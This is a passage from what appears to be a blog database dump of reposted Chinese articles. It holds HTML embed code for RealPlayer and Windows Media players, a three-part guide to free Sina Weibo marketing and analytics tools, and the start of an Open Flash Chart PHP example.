name=&quot;Volume&quot; value=&quot;-2500&quot;&gt;<br />\r\n&lt;param name=&quot;AnimationAtStart&quot; value=&quot;0&quot;&gt;<br />\r\n&lt;!-- Transparent at Start --&gt;</p>\r\n\r\n<p>&lt;param name=&quot;TransparentAtStart&quot; value=&quot;0&quot;&gt;<br />\r\n&lt;!-- Do not allow a change in display size --&gt;</p>\r\n\r\n<p>&lt;param name=&quot;AllowChangeDisplaySize&quot; value=&quot;0&quot;&gt;<br />\r\n&lt;!-- Do not allow scanning --&gt;</p>\r\n\r\n<p>&lt;param name=&quot;AllowScan&quot; value=&quot;0&quot;&gt;<br />\r\n&lt;!-- Do not show contect menu on right mouse click --&gt;</p>\r\n\r\n<p>&lt;param name=&quot;EnableContextMenu&quot; value=&quot;0&quot;&gt;<br />\r\n&lt;!-- Do not allow playback toggling on mouse click --&gt;<br />\r\n&lt;param name=&quot;ClickToPlay&quot; value=&quot;0&quot;&gt;<br />\r\n&lt;/object&gt;</p>\r\n\r\n<p>最简单的播放代码</p>\r\n\r\n<p>&lt;embed src=&quot;影片URL路径&quot;;;<br />\r\nautostart=&quot;true&quot; loop=&quot;true&quot; width=&quot;200&quot; height=&quot;150&quot; &gt;</p>\r\n\r\n<p>有图像的rm格式：</p>\r\n\r\n<p>&lt;OBJECT classid=clsid:CFCDAA03-8BE4-11cf-B84B-0020AFBBCCFA height=288 id=video1 width=305 VIEWASTEXT&gt;<br />\r\n&lt;param name=_ExtentX value=5503&gt;<br />\r\n&lt;param name=_ExtentY value=1588&gt;<br />\r\n&lt;param name=AUTOSTART value=-1&gt;<br />\r\n&lt;param name=SHUFFLE value=0&gt;<br />\r\n&lt;param name=PREFETCH value=0&gt;<br />\r\n&lt;param name=NOLABELS value=0&gt;<br />\r\n&lt;param name=SRC value=影片URL路径&gt;<br />\r\n&lt;param name=CONTROLS value=Imagewindow,StatusBar,ControlPanel&gt;<br />\r\n&lt;param name=CONSOLE value=RAPLAYER&gt;<br />\r\n&lt;param name=LOOP value=0&gt;<br />\r\n&lt;param name=NUMLOOP value=0&gt;<br />\r\n&lt;param name=CENTER value=0&gt;<br />\r\n&lt;param name=MAINTAINASPECT value=0&gt;<br />\r\n&lt;param name=BACKGROUNDCOLOR value=#000000&gt;<br />\r\n&lt;/OBJECT&gt;</p>\r\n\r\n<p>无图像的rm格式：如相声，歌曲。。。</p>\r\n\r\n<p>&lt;object ID=video2 WIDTH=300 HEIGHT=62 CLASSID=CLSID:CFCDAA03-8BE4-11CF-B84B-0020AFBBCCFA&gt;<br />\r\n&lt;param name=_ExtentX value=9657&gt;<br />\r\n&lt;param name=_ExtentY value=847&gt;<br />\r\n&lt;param name=AUTOSTART value=-1&gt;<br />\r\n&lt;param name=SHUFFLE value=0&gt;<br />\r\n&lt;param name=PREFETCH value=0&gt;<br />\r\n&lt;param name=NOLABELS value=0&gt;<br />\r\n&lt;param name=SRC value=影片URL路径&gt;<br />\r\n&lt;param name=CONTROLS value=StatusBar,controlpanel&gt;<br />\r\n&lt;param name=CONSOLE value=Clip1&gt;<br />\r\n&lt;param name=LOOP value=0&gt;<br />\r\n&lt;param name=NUMLOOP value=0&gt;<br />\r\n&lt;param name=CENTER value=0&gt;<br />\r\n&lt;param name=MAINTAINASPECT value=0&gt;<br />\r\n&lt;param name=BACKGROUNDCOLOR value=#000000&gt;<br />\r\n&lt;/object&gt;<br />\r\n最简单的media格式的播放器。。自动识别有无图像，但是版本是你机器的！<br />\r\n&lt;embed src=影片URL路径(如:mms://121,14.89.14/tv/makeawish.wmv) width=200 height=200 autostart=true loop=true&gt;&lt;/embed&gt;<br />\r\n有图像的media播放器，自动调用网上的插件。<br />\r\n&lt;object id=nstv classid=CLSID:6BF52A52-394A-11d3-B153-00C04F79FAA6 width=280 height=265 codebase=http://activex.microsoft.com/activex/controls/mplayer/en/nsmp2inf.cab#Version=5,1,52,701standby=Loading Microsoft? Windows Media? Player components... type=application/x-oleobject&gt;<br />\r\n&lt;param name=URL value=影片URL路径&gt;<br />\r\n&lt;PARAM NAME=UIMode value=full&gt;&lt;PARAM NAME=AutoStart value=true&gt;<br />\r\n&lt;PARAM NAME=Enabled value=true&gt;<br />\r\n&lt;PARAM NAME=enableContextMenu value=false&gt;<br />\r\n&lt;param name=WindowlessVideo value=true&gt;&lt;/object&gt;<br />\r\n无图像的media播放器。。。同上。<br />\r\n&lt;object id=nstv classid=CLSID:6BF52A52-394A-11d3-B153-00C04F79FAA6 width=280 height=60 codebase=http://activex.microsoft.com/activex/controls/mplayer/en/nsmp2inf.cab#Version=5,1,52,701standby=Loading Microsoft? Windows Media? Player components... type=application/x-oleobject&gt;<br />\r\n&lt;param name=URL value=影片URL路径&gt;<br />\r\n&lt;PARAM NAME=UIMode value=full&gt;&lt;PARAM NAME=AutoStart value=true&gt;<br />\r\n&lt;PARAM NAME=Enabled value=true&gt;<br />\r\n&lt;PARAM NAME=enableContextMenu value=false&gt;<br />\r\n&lt;/object&gt;<br />\r\n只是界面不同的media的调插件播放器。。建议不用这个，，你可以看！<br />\r\n&lt;embed src=影片URL路径 type=audio/x-pn-realaudio-plugin console=Clip1 controls=ControlPanel,StatusBar height=60 width=275 autostart=true&gt;&lt;/embed&gt;</p>\r\n\r\n<p>在线播放r m格式视频代码：</p>\r\n\r\n<p>&lt;object id=&quot;player&quot; name=&quot;player&quot; classid=&quot;clsid:CFCDAA03-8BE4-11cf-B84B-0020AFBBCCFA&quot; width=&quot;400&quot; height=&quot;272&quot;&gt;<br />\r\n&lt;param name=&quot;_ExtentX&quot; value=&quot;18415&quot;&gt;<br />\r\n&lt;param name=&quot;_ExtentY&quot; value=&quot;9102&quot;&gt;<br />\r\n&lt;param name=&quot;AUTOSTART&quot; value=&quot;-1&quot;&gt;<br />\r\n&lt;param name=&quot;SHUFFLE&quot; value=&quot;0&quot;&gt;<br />\r\n&lt;param name=&quot;PREFETCH&quot; value=&quot;0&quot;&gt;<br />\r\n&lt;param name=&quot;NOLABELS&quot; value=&quot;-1&quot;&gt;<br />\r\n&lt;param name=&quot;SRC&quot; value=&quot;影片URL路径&quot;&gt;<br />\r\n&lt;param name=&quot;CONTROLS&quot; value=&quot;Imagewindow&quot;&gt;<br />\r\n&lt;param name=&quot;CONSOLE&quot; value=&quot;clip1&quot;&gt;<br />\r\n&lt;param name=&quot;LOOP&quot; value=&quot;0&quot;&gt;<br />\r\n&lt;param name=&quot;NUMLOOP&quot; value=&quot;0&quot;&gt;<br />\r\n&lt;param name=&quot;CENTER&quot; value=&quot;0&quot;&gt;<br />\r\n&lt;param name=&quot;MAINTAINASPECT&quot; value=&quot;0&quot;&gt;<br />\r\n&lt;param name=&quot;BACKGROUNDCOLOR&quot; value=&quot;#000000&quot;&gt;<br />\r\n&lt;/object&gt;&lt;br&gt;<br />\r\n&lt;object ID=&quot;RP2&quot; CLASSID=&quot;clsid:CFCDAA03-8BE4-11cf-B84B-0020AFBBCCFA&quot; WIDTH=&quot;400&quot; HEIGHT=&quot;57&quot;&gt;<br />\r\n&lt;param name=&quot;_ExtentX&quot; value=&quot;18415&quot;&gt;<br />\r\n&lt;param name=&quot;_ExtentY&quot; value=&quot;1005&quot;&gt;<br />\r\n&lt;param name=&quot;AUTOSTART&quot; value=&quot;-1&quot;&gt;<br />\r\n&lt;param name=&quot;SHUFFLE&quot; value=&quot;0&quot;&gt;<br />\r\n&lt;param name=&quot;PREFETCH&quot; value=&quot;0&quot;&gt;<br />\r\n&lt;param name=&quot;NOLABELS&quot; value=&quot;-1&quot;&gt;<br />\r\n&lt;param name=&quot;SRC&quot; value=&quot;影片URL路径&quot;&gt;<br />\r\n&lt;PARAM NAME=&quot;CONTROLS&quot; VALUE=&quot;ControlPanel,StatusBar&quot;&gt;<br />\r\n&lt;param name=&quot;CONSOLE&quot; value=&quot;clip1&quot;&gt;<br />\r\n&lt;param name=&quot;LOOP&quot; value=&quot;0&quot;&gt;<br />\r\n&lt;param name=&quot;NUMLOOP&quot; value=&quot;0&quot;&gt;<br />\r\n&lt;param name=&quot;CENTER&quot; value=&quot;0&quot;&gt;<br />\r\n&lt;param name=&quot;MAINTAINASPECT&quot; value=&quot;0&quot;&gt;<br />\r\n&lt;param name=&quot;BACKGROUNDCOLOR&quot; value=&quot;#000000&quot;&gt;<br />\r\n&lt;/object&gt;</p>\r\n<p>转自：http://wenku.baidu.com/view/21a76b34eefdc8d376ee3286.html</p>\r\n',0,1438313617,0,0),(125,26,'榨干新浪微博所有免费资源——微博实用工具详解(上)','<p>工欲善其事，必先利其器！玩微博，也一样。微博开通过后，无论是官微、个人微博还是草根娱乐微博，都要先取一个好名字，再给它一个定位，然后才能开启你的微博之旅。玩微博的过程，我个人总结如下：学着玩&rarr;玩着学&rarr;教别人玩。对于微博工具的熟悉程度就得因人而异了，但就算没吃过猪肉，难道还没见过猪跑吗？不管你是微博专职运维人员，还是普通微博使用者，下面提到的这些应用你肯定用过或者其中一二。因为做图篇幅和版面的关系，列举的工具优缺点都一句话代过，在接下来的三篇文章中，我将为大家详细介绍如何深度发掘它们的价值。</p>\r\n\r\n<p>第一部分：内容生成。</p>\r\n\r\n<p>微博内容离不开文+图+链接三部分，纵然一个微博有千百万粉丝，但长期不更新或者没有好的内容，粉丝肯定是越来越少的，其实质就是：内容决定一切。这也是当下红人微博在细分领域也有众多粉丝的原因。</p>\r\n\r\n<p>内容是一个微博生存的必要条件，如果你的微博找不到好的文字内容，而又亟需，&ldquo;微博内容库&rdquo;和&ldquo;皮皮时光机&rdquo;。</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731115200606140.png\" style=\"height:351px; width:495px\" /></p>\r\n\r\n<p>这两款应用一定是最好的选择。它们的内容库里分类明确，并且有关键字搜索功能，而且每条微博连图都配好了，轻击鼠标选择发送即可。好的图片往往能使微博的传播事半功倍，皮皮就提供了独立的选图功能，让微博内容更加出彩。</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731115303351229.png\" style=\"height:349px; width:651px\" /></p>\r\n\r\n<p>&ldquo;微博段子&rdquo;是第三方网站，它是通过抓取新浪微博热门微博内容呈现在网站上面。这个网站是看微博热门、稀奇事的好地方。</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731115411782250.png\" style=\"height:448px; width:660px\" /></p>\r\n\r\n<p>其实，新浪微博自带了一个强大的内容库，那就是它的搜索功能。新浪微博搜索提供了热门转发、评论等微博内容（虽然很多热门转发都是广告，但还是有一些利用价值）。特别是关键字搜索，想要什么内容就搜关键字，搜出来的热门结果适当改改（鼓励原创，但时间紧可以这样利用），再发到自己微博上往往有异想不到的效果，我在忙时用这招屡试不爽。</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731115444330053.png\" style=\"height:369px; width:660px\" /></p>\r\n\r\n<p>现在是读图时代，好的图片往往能使微博传播达到事半功倍的效果。有时很多图片需要拼接在一起，目前大家熟知的拼图工具除了新浪微博内嵌的，还有美图、可牛和PS等。而在新浪微博拼图功能出现以前，我发微博时间紧的时候，拼图就用&ldquo;闻彰拼图&rdquo;，这个应用使用快捷，可以往四个方向拼贴，并且可以用一组图片拼GIF动态图片。缺点是如果照片尺寸大小不一，拼出来的组图也是不标准，非常的难看，且生成的图片画质较低，无法精确表现出细节。</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731115530995303.jpg\" style=\"height:595px; width:440px\" /></p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731115550529949.jpg\" style=\"height:545px; width:487px\" /></p>\r\n\r\n<p>手机端的拼图就用过&ldquo;GIF快手&rdquo;和&ldquo;美图秀秀&rdquo;。快手可能大家都比较熟悉，美图的拼图和微博一样，有模板和美化图片功能。另外手机端还有友图、图钉等美化工具，处理完都是可以同步或者分享到微博，用哪一款不重要，最重要的是自己喜欢。</p>\r\n\r\n<p>微博内容的最后一项就是链接，新浪微博提供了短地址服务，微博内容上的链接发布后呈现出来的都是短地址。如果不想发送微博又想生成短地址（视频可直接生成），那么&ldquo;短地址生成器&rdquo;这个应用就能帮上忙。另外还有一个第三方外链&ldquo;站长工具&rdquo;也提供了短地址生成服务。短地址有什么用呢？我经常是用在给客户微博提案内容呈现上面，有些链接有上百个字母，贴到PPT里既不美观又影响阅读，贴上新浪微博短地址既减少了篇幅又让人知道这是发在新浪微博上面的链接。总之，怎么方便怎么用，朋友们自己都体验体验，选出自己认为最好的即可。</p>\r\n\r\n<p>第二部分：内容发布</p>\r\n\r\n<p>当第一部分的文字、图片、视频和链接都准备就绪后，接下来就是发布这些内容。首先是发布时间的选择，微博用户活跃的高峰是中午休息和晚上下班回家过后，这两个时段是微博也是SNS网络的黄金时段，如果微博定位偏娱乐性质，这两个时段更不能错过，这里贴上前段时间新浪发布的企业微博活跃用户时段分布供大家参考（数据来源：199it）。</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731115625315551.jpg\" style=\"height:326px; width:678px\" /></p>\r\n\r\n<p>一个企业微博如果在新浪、腾讯、网易、搜狐等门户都开通了微博，那么多平台内容发布的应用就能帮上大忙，它能为企业微博管理者节省大把的运营时间。我用过的多平台发布应用有&ldquo;享拍微博通&rdquo;、&ldquo;微博通&rdquo;（这两家都在搜索引擎里称自己&ldquo;微博通&rdquo;，让一般人找得很坑爹，、YiBo微博（Android平台）、FaWave（Chrome插件）。其中享拍有手机客户端和Chrome插件，而且还能多平台定时发布，是一款微博多平台发布的&ldquo;利器&rdquo;。</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731115700897744.jpg\" style=\"height:427px; width:660px\" /></p>\r\n\r\n<p>YiBo微博用手机绑定腾讯微博的时候，以前需要一个授权码，我每次刷机或者更新软件过后就要重新绑定，这个授权码经常找得让人蛋疼！次数多了我也就懒得用它绑定腾讯微博。我觉得手机端多平台发布对企业微博的可利用价值在于对活动现场微博的发布，当微博运维人员到达某活动现场而又不能用电脑发布微博时，这时就需要用手机发布一些信息，YiBo微博和享拍手机端（微博通手机端没用过）能通过手机很方便在各平台上同步信息。多平台同步还有一个&ldquo;利器&rdquo;就是FaWave插件，有些朋友有&ldquo;软件安装强迫症&rdquo;（瞎扯的一个名字，大概就是不喜欢把软件装电脑上），那么这个插件能很好的解决微博在各平台上的同步问题，当然想同步到墙外的神马网站自然也不在话下。</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731115741961465.png\" style=\"height:800px; width:480px\" /></p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731115802807492.png\" style=\"height:800px; width:480px\" /></p>\r\n\r\n<p>发布平台说了这么多，没有IOS平台的应用。因为我还是穷学生一个，没钱买这些东东，如果有哪个朋友能赞助一台iPad，我写这篇文章肯定会再卖力十倍。 上篇的内容就介绍到这里，请大家持续关注中篇和下篇。</p>\r\n\r\n<p>作者：过期的白砂糖 http://weibo.com/333890929</p>\r\n\r\n<p>转自：http://www.chinaz.com/free/2011/1129/223362.shtml</p>\r\n',0,1438315137,0,0),(126,26,'榨干新浪微博所有免费资源——微博实用工具详解（中）','<p>第三部分：粉丝管理</p>\r\n\r\n<p>粉丝的管理我认为是任何一个微博最重要的工作，这部分也是细说的重点，所以单独列出来讲。</p>\r\n\r\n<p>好的微博发出去，没有粉丝别人怎么能看到。这里就有两种情况，一种情况是企业微博有推广预算，此时可以选择精品内容，拿出预算给微博红人转发，粉丝自然就来了。现在的微博红人都是以号养号，你看他们一天转发上百条和自己微博名字或者定位风马牛不相及的内容（俗称&ldquo;扯蛋&rdquo;），你肯定好奇过：他们为什么不转我的微博呢？其实有了钱一切都不是问题。</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731131457503308.jpg\" style=\"height:240px; width:660px\" /></p>\r\n\r\n<p>如果企业微博或者个人没有推广预算，就需要去先加别人的关注，因为这样才能让别人知道有你这样一个微博。选择粉什么样的人也很重要，新浪微博目前号称有26万个微群，那么光互粉群就有成千上万个，拿一个微博长期每天添加300个关注的上限，好的回粉数每天应该在100个以上。但是互粉群有一个很大的问题，那就是退粉率超过50%以上。人家回粉你，但是过几天就把你取消关注，或者是你的微博关注达到2000上限，取消了一些关注，被你取消关注的粉丝也会取消你的关注。经过我长期的观察和小号无数次的试验，找到了一个方法成功解决了退粉率高的问题。只要结合该微博的定位，找到一个和该定位相符的微群，再去挨个粉里面的人。这样你选择的关注者/粉丝和你微博有共同点，他们会对你的微博内容或话题感兴趣，从而降低了退粉率。这样每天能粉300人，通过微群增加的粉丝在七八十人左右，一周即可积累500个粉丝以上。</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731131536727127.jpg\" style=\"height:422px; width:581px\" /></p>\r\n\r\n<p>粉丝关注满过后，粉丝分析工具就发挥大作用。首先是&ldquo;关注查询&rdquo;，它能查询&ldquo;谁取消了我的关注&rdquo;、&ldquo;推荐潜在互粉对象&rdquo;&ldquo;查询两好友的共同好友&rdquo;、&ldquo;活跃、不活跃微博好友查询&rdquo;（可自定义活跃天数）&hellip;&hellip;通过这个应用，可以清楚的看到每天有多少粉丝取消了对你的关注，而且能看到你们是否为互粉好友。如果互粉好友取消了你的关注，既然他对你不仁，你也不必对他义，此时可以取消对他的关注即可。</p>\r\n\r\n<p>如果每天都粉别人，上面这招就行不通了。当一个微博关注数达到2000过后，无法再增加关注，挨个取消2000个关注者，这会耗费大量的时间和精力去筛选。这时你需要用到&ldquo;绿佛罗&rdquo;。</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731131757732785.jpg\" style=\"height:460px; width:660px\" /></p>\r\n\r\n<p>这个工具我在图表里注释它为&ldquo;新微博互粉利器&rdquo;。它能一键取消你所选择的关注或者粉丝，如&ldquo;我关注了但没有关注我的&rdquo;、&ldquo;没有头像的&rdquo;、&ldquo;加V，没加V&rdquo;等数十个选项。最最最关键的是，你可以在将要取消关注的上千人中，把你不想取消关注的人&ldquo;锁定&rdquo;，这样他们也会被批量操作误伤。</p>\r\n\r\n<p>&ldquo;关注查询&rdquo;和&ldquo;绿佛罗&rdquo;结合使用，微博运营者平均每天只需花不到10分钟时间，能使任何一普通微博一月粉丝数上涨2000左右。当然，因为新浪API5000的限制，如果是企业微博已经有数万甚至更多粉丝，上面的方法基本行不通。</p>\r\n\r\n<p>由于新浪API限制，好多朋友都说只要是走API接口的应用基本不靠谱。按照这样的推理，新浪官方的数据最&ldquo;靠谱&rdquo;，而这个靠谱的工具就是推出不久的&ldquo;微数据&rdquo;。微数据除了从影响力、覆盖度、传播力、活跃度等几个指标准来评价一个微博，还有对博文分析、我的粉丝、关注分析三大块的具体分析。这里着重要说&ldquo;我的粉丝&rdquo;里的&ldquo;粉丝分析&rdquo;，&ldquo;粉丝分析&rdquo;里有&ldquo;热门标签&rdquo;（图3.4），</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731131932601882.jpg\" style=\"height:343px; width:535px\" /></p>\r\n\r\n<p>它能分析粉丝最近一周感兴趣的话题及人数展示，如果粉丝标签与本周微博内容话题比较吻合，说明内容是没有问题的。如果粉丝标签与微博内容有一定出入，那么微博运营者可以根据这个结果，适当调整微博内容或话题走向，去迎合粉丝感兴趣话题，达成与粉丝的&ldquo;共识&rdquo;。</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731132132534481.jpg\" style=\"height:360px; width:531px\" /></p>\r\n\r\n<p>&ldquo;粉丝性别&rdquo;和&ldquo;粉丝分布&rdquo;</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731132221473013.jpg\" style=\"height:545px; width:551px\" /></p>\r\n\r\n<p>看的就是该微博对哪一部分人，哪些地区的人产生了影响，相信个人微博只对男女比例感兴趣，当然我也不例外，而企业微博就要细细研究各地区的分布了。还有一个功能是是&ldquo;粉丝趋势&rdquo;</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731132327530334.jpg\" style=\"height:334px; width:518px\" /></p>\r\n\r\n<p>，它用拆线图清楚的记录了该微博最近一周粉丝的增长情况。</p>\r\n\r\n<p>&ldquo;围脖粉丝分析&rdquo;比新浪微数据更全面，它不但提供了上述分析服务，还能分析加V粉丝比例、关注者和粉丝中粉丝最多的前十位，粉丝增长趋势记录周末也比微数据长，但这几天都无法访问，这里就点到为止。</p>\r\n\r\n<p>&ldquo;微博分析家&rdquo;是一款可以全面分析关注、粉丝、评论、转发、人脉的应用，它有免费版和付费版可以选择，这里只讨论免费版。免费版里最值得关注的就是&ldquo;人脉图解&rdquo;</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731132419343594.jpg\" style=\"height:324px; width:660px\" /></p>\r\n\r\n<p>这项功能，它比&ldquo;微数据&rdquo;里的人脉关系更全面，&ldquo;微数据&rdquo;的人脉关系只有两重，而分析家的人脉关系可以增加至三重甚至更多，并且可以从&ldquo;最爱转发&rdquo;、&ldquo;最新关注&rdquo;、&ldquo;最新粉丝&rdquo;三个侧重点来进行挖掘。但遗憾的是免费版只能运用到授权微博上，即无法查看别人的人脉关系。如果这方面有需要，那么像&ldquo;拓尔思&rdquo;的&ldquo;微博分析系统&rdquo;就可以更深入挖掘人脉关系，而且其号称是收集了新浪微博所有认证用户的数据，到底有没有这些数据不得而知，但是从我用过几次的挖掘效果来看，有一定的使用价值。</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731132450786041.jpg\" style=\"height:397px; width:660px\" /></p>\r\n\r\n<p>中篇的内容就先介绍到这里，下篇将详细为大家介绍内容传播分析和综合管理工具，请大家继续期待。</p>\r\n\r\n<p>作者：过期的白砂糖 http://weibo.com/333890929</p>\r\n\r\n<p>转自：http://www.chinaz.com/free/2011/1206/224651.shtml</p>\r\n',0,1438320318,0,0),(127,26,'榨干新浪微博所有免费资源——微博实用工具详解(下)','<p>第四部分：内容分析</p>\r\n\r\n<p>微博内容的分析，可以从内容的全面分析和单条内容的分析着手。这里说到的三个工具都是可以针对非授权微博进行分析，具有指导性意义。&ldquo;微博风云&rdquo;这个应用能提供的数据比较全面，有活跃度排名、影响力排名、微博等级等大指标。它们包含了平均每天微博数，本周微博数、微博原创率、活跃粉丝率、认证粉丝数、平均转发和评论条数等。另外还有&ldquo;兴趣领域&rdquo;能查看其微博内容所关注的领域和热点。另外一个重点就是&ldquo;数据统计&rdquo;，这里的统计包含了微博（即微博内容）、关注、粉丝三大块，微博内容分析从日期分布、时段分布、关键词、@提到、转发、来源、近期热门微博等数据有详实的记录。而关注和粉丝都从粉丝数、微博数、注册天数、省份、性别等方面来统计，其中粉丝分析只包括该微博的活跃粉丝率。面对一个微博的众多数据，如何应用就看微博运维人员的水平了，比如某Y省客户要做该省的精准营销，那么在选取微博资源进行推广时，需要考虑到的一个因素就是某微博红人具有Y省活跃粉丝数量，此时微博风云的数据就可以做为一个参考。当然，其它数据如何应用，就是考验你人挡杀人、佛挡杀佛功力的时候。</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731133601748522.jpg\" style=\"height:393px; width:660px\" /></p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731133758463180.jpg\" style=\"height:610px; width:628px\" /></p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731133822932159.jpg\" style=\"height:518px; width:624px\" /></p>\r\n\r\n<p>如果想要分析单条微博的传播，那么&ldquo;微博引爆点&rdquo;和&ldquo;转发粉丝数量统计&rdquo;就是一个绝佳的选择。这两款应用的使用方法都类似，输入某条微博地址，分析得出该条微博辐射范围和覆盖人数。引爆点只能分析近2000次转发的传播人员和覆盖人数，而后者理论上是可以全部分析出来，但是我用了几次感觉数据不是很准。得出来数据不准不重要，关键的是要看过程。</p>\r\n\r\n<p>如我在挖掘海底捞营销公司是谁的时候，找到了最初几条称赞海底捞服务好并被广为传播的微博，然后分析得出这几条微博的关键传播点。有了关键的传播点，就能很明显看出一个事件是不是在炒作，如果一条微博被转发上千次，分析得出是某一粉丝百万的微博红人（给钱才转的那种）为关键传播点，那么这个事件是炒作无疑。当一条微博转发上万，且还在猛增的时候，你可以持续关注该微博，推荐用引爆点分析，隔2000次分析一次传播点，等这次炒作结束过后你对这个事件微博传播的路径就会了如指掌。当然，这只是个人经验，更多功能还请朋友们深入挖掘。</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731133955496304.png\" style=\"height:729px; width:660px\" /></p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731134025923919.jpg\" style=\"height:660px; width:683px\" /></p>\r\n\r\n<p>第五部分：综合管理</p>\r\n\r\n<p>综合管理这部分，我图表上列出了孔明社交管理、众趣免费版和微博大师。因为微博大师收费，而且其官方微博说自己主要也是侧重数据分析，而我没有用过就没有发言权，这里就不多说了，剩下的孔明社交和众趣我对比着给大家介绍。</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731134125735284.jpg\" style=\"height:285px; width:660px\" /></p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731134146499874.jpg\" style=\"height:331px; width:660px\" /></p>\r\n\r\n<p>综合管理，简单点来说就是前面四部分介绍的功能基本上都有，而且还有管理功能。这两款综合应用都提供了定时发布、粉丝分析、传播分析、多账号管理等。在&ldquo;发布管理&rdquo;（靠，两家名字都一样。）</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731134225405310.jpg\" style=\"height:344px; width:660px\" /></p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731134249972891.jpg\" style=\"height:231px; width:550px\" /></p>\r\n\r\n<p>这一项上，孔明提供了内容库，而众趣则提供了图片拼接、文转图等实用小功能。所谓细节决定成败，我想这也是为什么这么多人使用它们的原因。在&ldquo;消息管理&rdquo;上（众趣对应&ldquo;微博管理&rdquo;），它们分别提供了如直接对话、主动对话、已/未回复评论等人性化的功能。众趣的&ldquo;统计报表&rdquo;分析内容和项目比孔明的分析更细节化，它还有一个我最喜欢的功能是可以对关注者和粉丝&ldquo;批量私信&rdquo;，想必好多朋友都在寻找有这一个功能的应用吧。</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731134356316210.png\" style=\"height:973px; width:600px\" /></p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731134421321127.jpg\" style=\"height:322px; width:660px\" /></p>\r\n\r\n<p>孔明的亮点在于可以锁定某一条微博对于&ldquo;跟踪&rdquo;，分析出其传播路径，多重传播分别覆盖人数等，这对于微博营销者来说无疑是一个利器。</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731134525194976.png\" style=\"height:723px; width:550px\" /></p>\r\n\r\n<p>最后，它们都提供了多账号绑定功能，可以只用一个平台账号管理多个微博账号，这无疑是多账号的微博运营者的福音。想我以前最多管理近十个账号的时候，虽然装了所以平台的浏览器，平时也千小心万小心但还是出过几次错，所以多账号管理这个功能可谓解了许多人的燃眉大急。总之，这两款免费综合管理工具各有千秋，大家喜欢哪家就用哪家吧。</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731134600417175.jpg\" style=\"height:445px; width:567px\" /></p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731134624306021.jpg\" style=\"height:347px; width:660px\" /></p>\r\n\r\n<p>好了，介绍到这里，我玩微博这几年来所收集的精品应用也都介绍完毕，虽然是些皮毛，自认为它们作用挺大的。如果你是有心人，已能从上面的内容挖出我不少东西。俗话话：授之以鱼，不如授之以渔。我对微博免费工具的体验也仅此而已，希望以后和大家多多交流，共同进步。</p>\r\n\r\n<p>作者：过期的白砂糖 http://weibo.com/333890929</p>\r\n\r\n<p>转自：http://www.chinaz.com/free/2011/1201/223921.shtml</p>\r\n',0,1438321653,0,0),(128,45,'open flash chart 横向柱状图代码','<p>HTML代码</p>\r\n\r\n<p>&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</p>\r\n\r\n<p>&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</p>\r\n\r\n<p>&lt;head&gt;</p>\r\n\r\n<p>&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</p>\r\n\r\n<p>&lt;title&gt;无标题文档&lt;/title&gt;</p>\r\n\r\n<p>&lt;script type=&quot;text/javascript&quot; src=&quot;public/swfobject.js&quot;&gt;&lt;/script&gt;</p>\r\n\r\n<p>&lt;script type=&quot;text/javascript&quot;&gt;</p>\r\n\r\n<p>var flashdate = &#39;z.php&#39;;</p>\r\n\r\n<p>var swf = &#39;public/open-flash-chart.swf&#39;;</p>\r\n\r\n<p>swfobject.embedSWF(swf,&quot;vml&quot;,&quot;650&quot;,&quot;314&quot;,&quot;9.0.0&quot;,null,{&quot;data-file&quot;:flashdate});</p>\r\n\r\n<p>&lt;/script&gt;</p>\r\n\r\n<p>&lt;/head&gt;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&lt;body&gt;</p>\r\n\r\n<p>&lt;div id=&quot;vml&quot;&gt;&lt;/div&gt;</p>\r\n\r\n<p>&lt;/body&gt;</p>\r\n\r\n<p>&lt;/html&gt;</p>\r\n\r\n<p>PHP部分</p>\r\n\r\n<p>&lt;?php</p>\r\n\r\n<p>include(&#39;include/openflashchart/open-flash-chart.php&#39;);</p>\r\n\r\n<p>$x_labels = array(&#39;Jan&#39;,&#39;Feb&#39;,&#39;Mar&#39;,&#39;Apr&#39;,&#39;May&#39;,&#39;Jun&#39;,&#39;Jul&#39;,&#39;Aug&#39;,&#39;Sep&#39;,&#39;Oct&#39;,&#39;Nov&#39;,&#39;Dec&#39;);</p>\r\n\r\n<p>$title = new title( &quot;Total hours on project mayhem&quot; );</p>\r\n\r\n<p>$hbar = new hbar( 